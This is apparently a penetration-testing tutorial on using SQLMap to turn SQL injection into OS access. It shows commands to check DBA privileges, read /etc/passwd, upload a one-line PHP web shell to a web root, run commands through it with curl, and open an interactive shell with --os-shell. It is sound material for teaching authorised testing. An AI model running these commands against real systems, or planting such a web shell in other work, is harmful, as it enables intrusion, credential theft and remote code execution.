## File Read/Write
The first part of OS Exploitation through an SQL Injection vulnerability is reading and writing data on the hosting server. Reading data is much more common than writing data, which is strictly privileged in modern DBMSes, as it can lead to system exploitation, as we will see.

## Checking for DBA Privileges
To check whether we have DBA privileges with SQLMap, we can use the `--is-dba` option:
```shell
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba

...
current user is DBA: False
...
```
Here we cannot read any file but if are DBA we can:
## Reading Local Files
Instead of manually injecting the above line through SQLi, SQLMap makes it relatively easy to read local files with the `--file-read` option:
```shell
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

As we can see, SQLMap said `files saved` to a local file. We can `cat` the local file to see its content.

## Writing Local Files
This is why modern DBMSes disable file-write by default and need certain privileges for DBA's to be able to write files. For example, in MySql, the `--secure-file-priv` configuration must be manually disabled to allow writing data into local files using the `INTO OUTFILE` SQL query, in addition to any local access needed on the host server, like the privilege to write in the directory we need.

To do that with SQLMap, we can use the `--file-write` and `--file-dest` options. First, let's prepare a basic PHP web shell and write it into a `shell.php` file:
```shell
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
\
```shell
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

Now, we can attempt to access the remote PHP shell, and execute a sample command:
```shell
curl http://www.example.com/shell.php?cmd=ls+-la
```

## OS Command Execution
Now that we confirmed that we could write a PHP shell to get command execution, we can test SQLMap's ability to give us an easy OS shell without manually writing a remote shell. SQLMap utilizes various techniques to get a remote shell through SQL injection vulnerabilities, like writing a remote shell, as we just did, writing SQL functions that execute commands and retrieve output or even using some SQL queries that directly execute OS command, like `xp_cmdshell` in Microsoft SQL Server. To get an OS shell with SQLMap, we can use the `--os-shell` option, as follows:
```shell
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

We see that SQLMap defaulted to `UNION` technique to get an OS shell, but eventually failed to give us any output `No output`. So, as we already know we have multiple types of SQL injection vulnerabilities, let's try to specify another technique that has a better chance of giving us direct output, like the `Error-based SQL Injection`, which we can specify with `--technique=E`:
```shell
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

As we can see, this time SQLMap successfully dropped us into an easy interactive remote shell, giving us easy remote code execution through this SQLi.